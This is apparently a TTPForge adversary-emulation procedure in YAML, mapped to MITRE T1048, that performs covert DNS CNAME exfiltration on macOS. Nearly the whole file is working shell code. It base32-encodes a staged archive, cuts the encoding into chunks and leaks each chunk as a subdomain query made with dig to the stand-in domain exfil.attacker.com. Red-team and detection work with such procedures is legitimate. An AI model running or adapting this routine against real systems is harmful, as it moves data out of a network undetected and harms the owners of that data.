---
api_version: 2.0
uuid: e7f8a0b1-c210-4d3e-4f5a-6b7c8d9e0f10
name: DNS CNAME Exfiltration
authors:
- TTPForge
description: |
  Covert DNS exfiltration using CNAME records and DNS resolution
mitre:
  tactics:
  - TA0010 Exfiltration
  techniques:
  - T1048 Exfiltration Over Alternative Protocol
requirements:
  platforms:
  - os: darwin
args:
- name: data_file
  description: File to exfiltrate via DNS
  type: string
  default: /tmp/.staging/data.tar.gz
- name: dns_domain
  description: Attacker-controlled DNS domain
  type: string
  default: exfil.attacker.com
- name: subdomain_prefix
  description: Prefix for exfiltration subdomains
  type: string
  default: data
- name: chunk_size
  description: Size of data chunks
  type: string
  default: '32'
steps:
- name: Verify file exists
  inline: test -f '{{ .Args.data_file }}' || (echo "File not found"; exit 1)
- name: Prepare data encoding
  inline: |
    echo "DNS CNAME Exfiltration Setup:"
    echo "  File: $(basename '{{ .Args.data_file }}')"
    echo "  Size: $(du -h '{{ .Args.data_file }}' | cut -f1)"
    echo "  Domain: {{ .Args.dns_domain }}"
    echo "  Chunk size: {{ .Args.chunk_size }} bytes"

    filesize=$(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || stat -c%s '{{ .Args.data_file }}')
    queries=$((filesize / {{ .Args.chunk_size }} + 1))
    echo "  Estimated DNS queries: $queries"
- name: Generate DNS query list
  inline: "if [ -f '{{ .Args.data_file }}' ]; then\n  echo \"Generating DNS query list...\"\n  \n  # Extract and encode file\
    \ data\n  data=$(base32 < '{{ .Args.data_file }}')\n  \n  # Generate subdomains\n  echo \"Sample DNS queries:\"\n  echo\
    \ \"  {{ .Args.subdomain_prefix }}-00001.{{ .Args.dns_domain }}\"\n  echo \"  {{ .Args.subdomain_prefix }}-00002.{{ .Args.dns_domain\
    \ }}\"\n  echo \"  {{ .Args.subdomain_prefix }}-00003.{{ .Args.dns_domain }}\"\n  echo \"  ...\"\nfi\n"
- name: Execute DNS exfiltration
  inline: |
    echo "Initiating DNS CNAME exfiltration..."
    encoded=$(base32 < '{{ .Args.data_file }}' | tr -d '=\n' | tr '[:upper:]' '[:lower:]')
    total=${#encoded}
    offset=0
    seq_num=0
    chunk_size={{ .Args.chunk_size }}
    while [ $offset -lt $total ]; do
      chunk=$(echo "$encoded" | cut -c$((offset+1))-$((offset+chunk_size)))
      subdomain="{{ .Args.subdomain_prefix }}-$(printf '%05d' $seq_num)-${chunk}.{{ .Args.dns_domain }}"
      dig +short CNAME "$subdomain" 2>/dev/null || true
      seq_num=$((seq_num + 1))
      offset=$((offset + chunk_size))
    done
    echo "DNS CNAME exfiltration complete: sent $seq_num queries"
  cleanup:
    inline: rm -f /tmp/test_dns_cname.dat
tests:
- name: dry_run_test
  dry_run: true
